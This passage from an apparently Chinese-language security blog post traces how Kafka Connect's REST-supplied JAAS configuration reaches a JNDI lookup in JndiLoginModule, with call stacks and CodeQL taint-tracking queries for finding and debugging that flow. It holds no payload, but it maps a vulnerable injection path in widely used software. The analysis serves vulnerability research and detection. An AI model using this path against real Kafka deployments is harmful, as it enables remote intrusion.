</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">            invokePriv(LOGIN_METHOD);</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">invokePriv</span><span class="params">(<span class="keyword">final</span> String methodName)</span> <span class="keyword">throws</span> LoginException </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">                        invoke(methodName);</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(String methodName)</span> <span class="keyword">throws</span> LoginException </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = moduleIndex; i &lt; moduleStack.length; i++, moduleIndex++) &#123;</span><br><span class="line">        ...</span><br><span class="line">                <span class="comment">// JndiLoginModule#initialize</span></span><br><span class="line">                    Object[] initArgs = &#123;subject,</span><br><span class="line">                                        callbackHandler,</span><br><span class="line">                                        state,</span><br><span class="line">                                        moduleStack[i].entry.getOptions() &#125;;</span><br><span class="line">                    methods = moduleStack[i].<span class="keyword">module</span>.getClass().getMethods();</span><br><span class="line">                ...</span><br><span class="line">                <span class="comment">// JndiLoginModule#login</span></span><br><span class="line">                <span class="keyword">boolean</span> status = ((Boolean)methods[mIndex].invoke</span><br><span class="line">                                (moduleStack[i].<span class="keyword">module</span>, args)).booleanValue();</span><br></pre></td></tr></table></figure><h3 id="1-2-JndiLoginModule"><a href="#1-2-JndiLoginModule" class="headerlink" title="1.2 JndiLoginModule"></a>1.2 JndiLoginModule</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiLoginModule</span> <span class="keyword">implements</span> <span class="title">LoginModule</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String userProvider;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(Subject subject, CallbackHandler callbackHandler,</span></span></span><br><span class="line"><span class="function"><span class="params">                           Map&lt;String,?&gt; sharedState,</span></span></span><br><span class="line"><span class="function"><span class="params">                           Map&lt;String,?&gt; options)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">this</span>.options = options;</span><br><span class="line">        userProvider = (String)options.get(USER_PROVIDER);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">login</span><span class="params">()</span> <span class="keyword">throws</span> LoginException </span>&#123;</span><br><span class="line">...</span><br><span class="line">                attemptAuthentication(<span class="keyword">true</span>);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">attemptAuthentication</span><span class="params">(<span class="keyword">boolean</span> getPasswdFromSharedState)</span></span>&#123;</span><br><span class="line">...</span><br><span class="line">InitialContext iCtx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx = (DirContext)iCtx.lookup(userProvider);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-调用栈"><a href="#1-3-调用栈" class="headerlink" title="1.3 调用栈"></a>1.3 调用栈</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">attemptAuthentication:502, JndiLoginModule (com.sun.security.auth.module)</span><br><span class="line">login:303, JndiLoginModule (com.sun.security.auth.module)</span><br><span class="line">invoke:747, LoginContext (javax.security.auth.login)</span><br><span class="line">run:672, LoginContext$4 (javax.security.auth.login)</span><br><span class="line">run:670, LoginContext$4 (javax.security.auth.login)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">invokePriv:670, LoginContext (javax.security.auth.login)</span><br><span class="line">login:581, LoginContext (javax.security.auth.login)</span><br><span class="line">login:60, AbstractLogin (org.apache.kafka.common.security.authenticator)</span><br><span class="line">&lt;init&gt;:62, LoginManager (org.apache.kafka.common.security.authenticator)</span><br><span class="line">acquireLoginManager:105, LoginManager (org.apache.kafka.common.security.authenticator)</span><br><span class="line">configure:170, SaslChannelBuilder (org.apache.kafka.common.network)</span><br><span class="line">create:192, ChannelBuilders (org.apache.kafka.common.network)</span><br><span class="line">clientChannelBuilder:81, ChannelBuilders (org.apache.kafka.common.network)</span><br><span class="line">createChannelBuilder:105, ClientUtils (org.apache.kafka.clients)</span><br><span class="line">newSender:517, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">&lt;init&gt;:460, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">&lt;init&gt;:291, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">&lt;init&gt;:274, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">doBuild:1348, Worker$SourceTaskBuilder (org.apache.kafka.connect.runtime)</span><br><span class="line">build:1255, Worker$TaskBuilder (org.apache.kafka.connect.runtime)</span><br><span class="line">startTask:672, Worker (org.apache.kafka.connect.runtime)</span><br><span class="line">startSourceTask:567, Worker (org.apache.kafka.connect.runtime)</span><br><span class="line">startTask:397, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">createConnectorTasks:381, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">createConnectorTasks:375, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">updateConnectorTasks:432, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">lambda$putConnectorConfig$2:232, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br></pre></td></tr></table></figure><h2 id="0x02-CodeQL-初探"><a href="#0x02-CodeQL-初探" class="headerlink" title="0x02 CodeQL 初探"></a>0x02 CodeQL 初探</h2><h3 id="2-1-Sink"><a href="#2-1-Sink" class="headerlink" title="2.1 Sink"></a>2.1 Sink</h3><p>如上文，sink点是LoginContext构造函数的第四个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists( </span><br><span class="line">        ConstructorCall cc|</span><br><span class="line">        cc.getConstructor().getDeclaringType().getASupertype*().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;LoginContext&quot;)</span><br><span class="line">        and sink.asExpr() &#x3D; cc.getArgument(3)</span><br><span class="line">        and cc.getNumArgument() &#x3D; 4</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-604.png" alt="upload successful"></p><h3 id="2-2-Source"><a href="#2-2-Source" class="headerlink" title="2.2 Source"></a>2.2 Source</h3><p>kafka 遵循JAX-RS实现的REST API，codeql 暂不支持此类source，需要自己实现。</p><p>以ConnectorsResource.java 为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.ws.rs.Path;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.POST;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@POST</span></span><br><span class="line">    <span class="meta">@Path(&quot;/&quot;)</span></span><br><span class="line">    <span class="meta">@Operation(summary = &quot;Create a new connector&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Response <span class="title">createConnector</span><span class="params">(<span class="keyword">final</span> <span class="meta">@Parameter(hidden = true)</span> <span class="meta">@QueryParam(&quot;forward&quot;)</span> Boolean forward,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    <span class="keyword">final</span> <span class="meta">@Context</span> HttpHeaders headers,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    <span class="keyword">final</span> CreateConnectorRequest createRequest)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="comment">// Trim leading and trailing whitespaces from the connector name, replace null with empty string</span></span><br><span class="line">        <span class="comment">// if no name element present to keep validation within validator (NonEmptyStringWithoutControlChars</span></span><br><span class="line">        <span class="comment">// allows null values)</span></span><br><span class="line">        String name = createRequest.name() == <span class="keyword">null</span> ? <span class="string">&quot;&quot;</span> : createRequest.name().trim();</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; configs = createRequest.config();</span><br><span class="line">        checkAndPutConnectorConfigName(name, configs);</span><br><span class="line"></span><br><span class="line">        FutureCallback&lt;Herder.Created&lt;ConnectorInfo&gt;&gt; cb = <span class="keyword">new</span> FutureCallback&lt;&gt;();</span><br><span class="line">        herder.putConnectorConfig(name, configs, <span class="keyword">false</span>, cb);</span><br></pre></td></tr></table></figure><p>有PATH修饰的方法的参数，我们认为其为污点传播source点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private class JavaxWSRSSource extends RemoteFlowSource &#123;</span><br><span class="line">    JavaxWSRSSource()&#123;</span><br><span class="line">        exists( </span><br><span class="line">            Method m, Annotation a | </span><br><span class="line">            m.getAParameter() &#x3D; this.asParameter()</span><br><span class="line">            and m.getFile().getAbsolutePath().matches(&quot;%ConnectorsResource.java&quot;)</span><br><span class="line">            and a.getType().hasQualifiedName(&quot;javax.ws.rs&quot;, &quot;Path&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    override string getSourceType() &#123; result &#x3D; &quot;javax.ws.rs&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123; </span><br><span class="line">        src instanceof RemoteFlowSource </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>Tips: src instanceof RemoteFlowSource, 包含了RemoteFlowSource的子类</p></blockquote><p><img src="/images/pasted-605.png" alt="upload successful"></p><h3 id="2-3-First-Try"><a href="#2-3-First-Try" class="headerlink" title="2.3 First Try"></a>2.3 First Try</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line">private class JavaxWSRSSource extends RemoteFlowSource &#123;</span><br><span class="line">    JavaxWSRSSource()&#123;</span><br><span class="line">        exists( </span><br><span class="line">            Method m, Annotation a | </span><br><span class="line">            m.getAParameter() &#x3D; this.asParameter()</span><br><span class="line">            and m.getFile().getAbsolutePath().matches(&quot;%ConnectorsResource.java&quot;)</span><br><span class="line">            and a.getType().hasQualifiedName(&quot;javax.ws.rs&quot;, &quot;Path&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    override string getSourceType() &#123; result &#x3D; &quot;javax.ws.rs&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    VulConfig() &#123; this &#x3D; &quot;jaas vul&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123; </span><br><span class="line">        src instanceof JavaxWSRSSource</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        &#x2F;&#x2F; JDK漏洞触发点：new LoginContext(,,,configuration)</span><br><span class="line">        exists( </span><br><span class="line">            ConstructorCall cc|</span><br><span class="line">            cc.getConstructor().getDeclaringType().getASupertype*().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;LoginContext&quot;)</span><br><span class="line">            and sink.asExpr() &#x3D; cc.getArgument(3)</span><br><span class="line">            and cc.getNumArgument() &#x3D; 4</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;$@.&quot;, source.getNode(), &quot;user input&quot;</span><br></pre></td></tr></table></figure><p>妥妥的，毫无疑问，不会有结果</p><p><img src="/images/pasted-606.png" alt="upload successful"></p><h2 id="0x03-How-to-Debug-CodeQL？"><a href="#0x03-How-to-Debug-CodeQL？" class="headerlink" title="0x03 How to Debug CodeQL？"></a>0x03 How to Debug CodeQL？</h2><p>中间节点断开是codeql 常见的问题，可以通过isAdditionalTaintStep 将断掉的污点链串起来。</p><p>问题是如何判断污点链在哪里断掉的？</p><ul><li>好消息是官方提供了partial flow 方式进行对data-flow 的Debug，参考【1】</li><li>坏消息是官方提供demo语法太老了，不支持新的codeql</li></ul><h3 id="3-1-partial-flow-Old"><a href="#3-1-partial-flow-Old" class="headerlink" title="3.1 partial flow - Old"></a>3.1 partial flow - Old</h3><p>partial flow支持正向搜索与反向搜索，以正向搜索为例，它的污点不关心是否sink，会一直传播，直到到达explorationLimit或者传播不下去，才会停止。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PartialPathGraph</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    MyTaintTrackingConfig() &#123; this &#x3D; &quot;jaas vul&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override int explorationLimit() &#123; result &#x3D; 5 &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123; </span><br><span class="line">        exists(Class c| </span><br><span class="line">            c.getAField() &#x3D; source.asExpr().(FieldAccess).getField()</span><br><span class="line">            and c.hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;SaslChannelBuilder&quot;)</span><br><span class="line">            and source.asExpr().(FieldRead).getField().hasName(&quot;jaasContexts&quot;)</span><br><span class="line">            and source.asExpr().getEnclosingCallable().hasName(&quot;configure&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        &#x2F;&#x2F; JDK漏洞触发点：new LoginContext(,,,configuration)</span><br><span class="line">        exists( </span><br><span class="line">            ConstructorCall cc|</span><br><span class="line">            cc.getConstructor().getDeclaringType().getASupertype*().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;LoginContext&quot;)</span><br><span class="line">            and sink.asExpr() &#x3D; cc.getArgument(3)</span><br><span class="line">            and cc.getNumArgument() &#x3D; 4</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">from MyTaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink</span><br><span class="line">where cfg.hasPartialFlow(source, sink, _) </span><br><span class="line">select sink, source, sink, &quot;Partial flow from unsanitized user data&quot;</span><br></pre></td></tr></table></figure><ul><li>反向搜索用hasPartialFlowRev</li><li>explorationLimit 是最大的传播深度</li></ul><h3 id="3-2-partial-flow-New"><a href="#3-2-partial-flow-New" class="headerlink" title="3.2 partial flow - New"></a>3.2 partial flow - New</h3><p>具体版本未考证，codeql 2.13.1已经不支持以上的方式，如果要用partial flow调试，可以参考以下的例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import DataFlow</span><br><span class="line"></span><br><span class="line">module Config implements ConfigSig &#123;</span><br><span class="line">    predicate isSource(DataFlow::Node source) &#123; </span><br><span class="line">        exists(Class c| </span><br><span class="line">            c.getAField() &#x3D; source.asExpr().(FieldAccess).getField()</span><br><span class="line">            and c.hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;SaslChannelBuilder&quot;)</span><br><span class="line">            and source.asExpr().(FieldRead).getField().hasName(&quot;jaasContexts&quot;)</span><br><span class="line">            and source.asExpr().getEnclosingCallable().hasName(&quot;configure&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        &#x2F;&#x2F; JDK漏洞触发点：new LoginContext(,,,configuration)</span><br><span class="line">        exists( </span><br><span class="line">            ConstructorCall cc|</span><br><span class="line">            cc.getConstructor().getDeclaringType().getASupertype*().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;LoginContext&quot;)</span><br><span class="line">            and sink.asExpr() &#x3D; cc.getArgument(3)</span><br><span class="line">            and cc.getNumArgument() &#x3D; 4</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int explorationLimit() &#123; result &#x3D; 5 &#125;</span><br><span class="line"></span><br><span class="line">module PartialFlow &#x3D; Global&lt;Config&gt;::FlowExploration&lt;explorationLimit&#x2F;0&gt;;</span><br><span class="line">import PartialFlow::PartialPathGraph</span><br><span class="line"></span><br><span class="line">from PartialFlow::PartialPathNode source, int dist, PartialFlow::PartialPathNode sink</span><br><span class="line">where PartialFlow::partialFlow(source, sink, dist) </span><br><span class="line">select source, sink, sink, &quot;Partial flow from unsanitized user data&quot;</span><br></pre></td></tr></table></figure><ul><li>partial flow 结果也不可全信，原因未知</li><li>explorationLimit 可以从小往大依次尝试，可以从5开始，很容易结果多达几个G</li><li>VScode的结果不方便搜索，可以直搜索sarif/csv结果</li><li>猜测可能类似最短路径之类的搜索算法，如果有更短的路径，就会丢弃更复杂的，会造成遗漏，可以用isSanitizer 来进行过滤</li></ul><h3 id="3-3-Manual-Debug"><a href="#3-3-Manual-Debug" class="headerlink" title="3.3 Manual Debug"></a>3.3 Manual Debug</h3><p>当partial flow也无效果时，那么只能尝试最笨的办法了，自己替换isSource / isSink 的条件，选择对应调用栈中的Expr，依次排查。</p><blockquote><p>Trick: 限制污点位置</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 限制sink点在某个类内</span><br><span class="line">sink.asExpr().getLocation().getFile().getRelativePath().matches(&quot;%Login.java&quot;)</span><br><span class="line"># 限制sink点在某个函数内</span><br><span class="line">sink.asExpr().getEnclosingCallable().hasName(&quot;login&quot;)</span><br></pre></td></tr></table></figure><h2 id="0x04-Run-CodeQL"><a href="#0x04-Run-CodeQL" class="headerlink" title="0x04 Run CodeQL"></a>0x04 Run CodeQL</h2><h2 id="4-1-Backward-Analysis"><a href="#4-1-Backward-Analysis" class="headerlink" title="4.1 Backward Analysis"></a>4.1 Backward Analysis</h2><p>选择调用栈的一个中间节点，以LoginManager#acquireLoginManager第一个参数config作为source点。</p><h4 id="4-1-1-LoginManager-acquireLoginManager"><a href="#4-1-1-LoginManager-acquireLoginManager" class="headerlink" title="4.1.1 LoginManager#acquireLoginManager"></a>4.1.1 LoginManager#acquireLoginManager</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"> import java</span><br><span class="line"> import semmle.code.java.security.RequestForgeryConfig</span><br><span class="line"> import DataFlow::PathGraph</span><br><span class="line"> import semmle.code.java.dataflow.FlowSources</span><br><span class="line"> import semmle.code.java.dataflow.internal.DataFlowImplCommon as DataFlowImplCommon</span><br><span class="line"> import semmle.code.java.dataflow.internal.DataFlowPrivate</span><br><span class="line"> import semmle.code.java.dataflow.internal.DataFlowNodes</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">private class JAASSource extends RemoteFlowSource &#123;</span><br><span class="line">    JAASSource()&#123;</span><br><span class="line">        exists(</span><br><span class="line">            Method m | m.getParameter(0) &#x3D; this.asParameter() |</span><br><span class="line">            m.getDeclaringType*().hasQualifiedName(&quot;org.apache.kafka.common.security.authenticator&quot;, &quot;LoginManager&quot;)</span><br><span class="line">            and m.hasName(&quot;acquireLoginManager&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    override string getSourceType() &#123; result &#x3D; &quot;jaas&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    VulConfig() &#123; this &#x3D; &quot;jaas vul&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123; </span><br><span class="line">        src instanceof JAASSource</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        &#x2F;&#x2F; JDK漏洞触发点：new LoginContext(,,,configuration)</span><br><span class="line">        exists( </span><br><span class="line">            ConstructorCall cc|</span><br><span class="line">            cc.getConstructor().getDeclaringType().getASupertype*().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;LoginContext&quot;)</span><br><span class="line">            and sink.asExpr() &#x3D; cc.getArgument(3)</span><br><span class="line">            and cc.getNumArgument() &#x3D; 4</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"> where config.hasFlowPath(source, sink)</span><br><span class="line"> select sink.getNode(), source, sink, &quot;$@.&quot;, source.getNode(), &quot;user input&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-593.png" alt="upload successful"></p><blockquote><p>结论：LoginManager#acquireLoginManager的第一个参数config 可以最终传递给最终sink点</p></blockquote><h4 id="4-1-2-SaslChannelBuilder-configure"><a href="#4-1-2-SaslChannelBuilder-configure" class="headerlink" title="4.1.2 SaslChannelBuilder#configure"></a>4.1.2 SaslChannelBuilder#configure</h4><h5 id="configs参数"><a href="#configs参数" class="headerlink" title="configs参数"></a>configs参数</h5><p>继续往上回溯一级，到SaslChannelBuilder#configure的第一个参数configs，将source改成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JAASSource()&#123;</span><br><span class="line">    exists(</span><br><span class="line">        Method m | m.getParameter(0) &#x3D; this.asParameter() |</span><br><span class="line">        m.getDeclaringType*().hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;SaslChannelBuilder&quot;)</span><br><span class="line">        and m.hasName(&quot;configure&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次运行无结果</p><blockquote><p>这是因为仅仅SaslChannelBuilder#configure 参数configs 是不够的，实际的污点应该是SaslChannelBuilder#jaasContexts 属性，在单步定位的时候，需要注意此类问题，具体是哪个参数是污点。</p></blockquote><p><img src="/images/pasted-598.png" alt="upload successful"></p><h5 id="jaasContexts-属性"><a href="#jaasContexts-属性" class="headerlink" title="jaasContexts 属性"></a>jaasContexts 属性</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JAASSource()&#123;</span><br><span class="line">    exists(Class c| </span><br><span class="line">        c.getAField() &#x3D; this.asExpr().(FieldAccess).getField()</span><br><span class="line">        and c.hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;SaslChannelBuilder&quot;)</span><br><span class="line">        and this.asExpr().(FieldRead).getField().hasName(&quot;jaasContexts&quot;)</span><br><span class="line">    )</span><br><span 